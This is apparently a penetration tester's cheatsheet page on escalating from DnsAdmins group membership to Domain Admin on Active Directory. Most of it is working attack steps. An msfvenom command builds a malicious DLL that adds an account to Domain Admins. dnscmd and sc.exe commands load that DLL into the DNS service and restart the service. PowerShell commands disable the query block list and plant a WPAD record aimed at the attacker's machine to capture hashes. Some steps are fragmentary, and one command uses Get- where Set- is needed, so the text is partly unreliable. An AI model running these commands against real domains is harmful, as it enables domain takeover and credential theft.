# DnsAdmin To DC

Members of the DnsAdmin group, see [[Active-Directory-Default-Security-Groups-Table]] table showing relative relation to other default AD groups can perform [[DLL-Injection]] into the DNS process running as System to escalate when that service restarts. This also requires AD to be present as it is form of [[Active-Directory-Privilege-Escalation]].

Requires either:
- Compromised DnsAdmin group member 
- Write privileges to a DNS server object.



https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-directory-6f7adbc7005b
https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/

https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise

[Ippsec](https://www.youtube.com/watch?v=8KJebvmd1Fk) showcases a compilation of shellcode that will also not crash the DNS server for a more OPSEC safe method of privilege escalation, from [ired](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise).

1. Download https://github.com/dim0x69/dns-exe-persistance - template code for a DNS DLL plugin
2. Open .sln file in Visual Studio



1. Use [mimilibdll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) authored by Benjamin Delphy by  modifying the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file to execute code - review [labofapenetrationtester article](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)

2. Create a WPAD Record - [[Responder-Cheatsheet]] or [[Inveigh-Cheatsheet]] to capture hashes as [DnsAdmins have permission to disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps)
```powershell
# Disable the global query block list
Get-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.$domain.local
# Create a malicious A record point to our machine
Add-DnsServerResourceRecordA -Name wpad -ZoneName $domain.local -ComputerName dc01.$domain.local -IPv4Address $badIPv4address
```

3. User Dnscmd to load a plugin
[adsecurity DNSAdmin to Domain Admin article](https://adsecurity.org/?p=4064) attack chain:
- *DNS management is performed over RPC*
- *[ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL's path. *This can be done with the `dnscmd` tool from the command line*
- *When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated*
- *When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)*
- *An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.*

[[Creating-Malicious-DLLs]], Review [Security Descriptor Definition Lanaguage](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language) - [How to view and modify permissions in Windows](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/); 

Create a malicious DLL ([[Dynamic-Link-Libraries]]) with `msfvenom` - [[MSFVenom-Payloads]]
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```
Warning stop and starting a DNS server is destructive and bad [[OPSEC]]
```powershell
dnscmd.exe /config /serverlevelplugindll C:\programdata\adduser.dll
# If we are Privilege Escalating we may have access to ActiveDirectory PowerShell module:
# Get-ADGroupMember -Identity DnsAdmins
# The below may fail, because wmic is slow deprecating
wmic useraccount where name="$compromisedUserThatRanDnscmd" get sid
# If you have access to WmiObject then
Get-WmiObject win32_useraccount | Select name,sid

# Check permissions on DNS service - beware SDDL
sc.exe sdshow DNS
# Stop and start DNS to load the plugin
sc.exe stop DNS
sc.exe start DNS
# Confirm account is now in the Domain Admins group
net group "Domain Admins" /dom

#
# Cleanup
#
# Confirm registry key added
reg query \\$IPaddress\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
# Delete registry key
reg delete \\$IPaddress\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters/v ServerLevelPluginDll
```

This article: [http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) utilises [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) from Ben Delphy, just modify the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file.


```powershell
# Create
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName $dcSub.$Domain.$tld
# Adding a WPAD Record
Add-DnsServerResourceRecordA -Name wpad -ZoneName $Domain.$tld -ComputerName $dcSub.$Domain.$tld -IPv4Address $attackingMachine
```